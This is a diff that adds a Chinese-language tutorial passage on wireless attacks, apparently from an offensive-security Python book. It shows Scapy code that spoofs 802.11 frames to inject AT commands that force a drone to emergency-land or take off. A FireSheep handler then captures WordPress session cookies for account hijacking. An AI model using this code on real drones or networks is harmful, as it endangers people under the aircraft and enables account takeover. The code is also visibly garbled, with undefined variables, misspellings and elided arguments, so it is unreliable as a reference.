@@ -272,3 +272,141 @@ class interceptThread(threading.Thread):
 
 ### 用 Scapy 制作 802.11 数据帧
 
+接下来，要伪造一个包含无人机命令的数据包。要从当前的数据包或者帧中复制出必要的信息。这个数据包穿越了 RadioTap、802.11、SNAP、LLC、IP 和 UDP 层。
+
+编写一个完整的库来复制各个层中的信息。注意，每个层中都要忽略掉一些字段，比如不复制表示 IP 包包长的字段，这个可以让 Scapy 自动把这个字段的值计算出来。同样，也不会记录那些存储校验和的字段。
+
+```python
+from scapy.all import *
+def dup_radio(pkt):
+    r_pkt = pkt.getlayer(RadioTap)
+    version = r_pkt.version
+    pad = r_pkt.pad
+    present = r_pkt.present
+    notdecoded = r_pkt.notdecoded
+    n_pkt = RadioTap(version=version, pad=pad, present=present, notdecoded=notdecoded)
+	return n_pkt
+
+def dup_dot11(pkt):
+    subtype = d_pkt.subtype
+    copy_type = d_pkt.type
+    proto = d_pkt.proto
+    fc_field = d_pkt.FCfield
+    copy_id = d_pkt.ID
+    addr1 = d_pkt.addr1
+    addr2 = d_pkt.addr2
+    addr3 = d_pkt.addr3
+    sc = d_pkt.SC
+    addr4 = d_pkt.addr4
+    n_pkt = Dot11(subtype=subtype, type=copy_type, proto=proto, fc_field=...)
+    return n_pkt
+
+def dup_snap(pkt):
+    s_pkt = pkt.getlayer(SNAP)
+    oui = s_pkt.OUI
+    code = s_pkt.code
+    n_pkt = SNAP(OUI=oui, code=code)
+    return n_pkt
+
+def dup_llc(pkt):
+	l_pkt = pkt.getlayer(LLC)
+    dsap = l_pkt.dsap
+    ssap = l_pkt.ssap
+    ctrl = l_pkt.ctrl
+    n_pkt = LLC(dsap=dsap, ssap=ssap, ctrl=ctrl)
+    return n_pkt
+
+def dup_ip(pkt):
+    i_pkt = pkt.getlayer(IP)
+    version = i_pkt.version
+    tos = i_pkt.tos
+    copy_id = i_pkt.id
+    flags = i_pkt.flags
+    ttl = i_pkt.ttl
+    proto = i_pkt.proto
+    src = i_pkt.src
+    dst = i_pkt.dst
+    options = i_pkt.options
+    n_pkt = IP(version=version, id=copy_id, ...)
+    return n_pkt
+
+def dup_udp(pkt):
+    u_pkt = pkt.getlayer(UDP)
+    sport = u_pkt.sport
+    dport = d_pkt.dport
+    n_pkt = UDP(sport=sport, dport=dport)
+    return n_pkt
+```
+
+接下来拼凑在一起：
+
+```python
+def inject_cmd(self, cmd):
+    radio = dup.dup_radio(self.cur_pkt)
+    dot11 = dup.dup_dot11(self.cur_pkt)
+    snap = dup.dup_snap(self.cur_pkt)
+    llc = dup.dup_llc(self.cur_pkt)
+    ip = dup.dup_ip(self.cur_pkt)
+    udp = dup.dup_udp(self.cur_pkt)
+    raw = Raw(load=cmd)
+    inject_pkt = radio / dot11 / llc / snap / ip / udp / raw
+    sendp(inject_pkt)
+```
+
+紧急迫降的指定对控制无人机来说是一条非常重要的指令。这个指令可以迫使无人机关闭引擎，并立即迫降下来。为了发出这条指令，可以使用序列号是当前的序列号再加上 100。接下来要发出指令 `AT*COMWDG=$SEQ\r`。这条指令的作用是把通信中的计数器重置成我们新设置的顺序值。之后无人机将会忽略之前的或者顺序号不匹配的指令。最后，再发送紧急迫降指令
+
+### 完成攻击，使无人机紧急迫降
+
+```python
+def emergency_land(self):
+    spoof_seq = self.seq + 100
+    watch = "AT*COMWDG={}\r".format(spoof_seq)
+    to_cmd = "AT*REF={},{}\r".format(spoof_seq + 1, EMER)
+    self.inject_cmd(watch)
+    self.inject_cmd(to_cmd)
+    
+def take_off(self):
+    spoof_seq = self.seq + 100
+    watch = "AT*COMWDG={}\r".format(spoof_seq)
+    to_cmd = "AT*REF={},{}\r".format(spoof_seq + 1, TAKEOFF)
+    self.inject_cmd(watch)
+    self.inject_cmd(to_cmd)
+```
+
+## 探测火绵羊
+
+一款叫火绵羊（FireSheep）的工具，提供了一个简单的双击界面，可以远程接管 Facebook、Twitter、谷歌和其他大量社交媒介中毫无戒心的用户帐户。火绵羊工具会被动地监听无线网卡上由这些 Web 站点提供的 cookie。如果用户连接了不安全的无线网络，也没有使用诸如 HTTPS 之类的服务端控制措施来保护它的会话，火绵羊就会截获这些 cookie 供攻击者再次使用它们。
+
+如果想截取特定会话中的 cookie，供重放的话，也有一个易用的接口方便编写定制的处理代码。下面这段处理代码是针对 Wordpress 的 Cookie 的
+
+```javascript
+register({
+  name: "Wordpress",
+  matchPacket: function(packet) {
+    for (varcookieName in packet.coookies) {
+      if (cookieName.match0) {
+        return true;
+      }
+    }
+  },
+  
+  processPacket: function () {
+    this.siteUrl += "wp-admin/"
+    for (varcookieName in this.firstPacket.cookies) {
+      if (cookieName.match(/^wordpress_[0-9a-fA-F]{32}$/)) {
+        this.sessionId = this.firstPacket.cookies[cookieName];
+        break;
+      }
+    }
+  },
+    
+  identifyUser: function () {
+    var resp = this.httpGet(this.siteUrl);
+    this.userName = resp.body.querySelectorAll("#user_info a")[0].textContent;
+    this.siteName = "Wordpress (" + this.firstPacket.host + ")";
+  }
+});
+```
+
+### 理解 WordPress 的会话 cookies
+
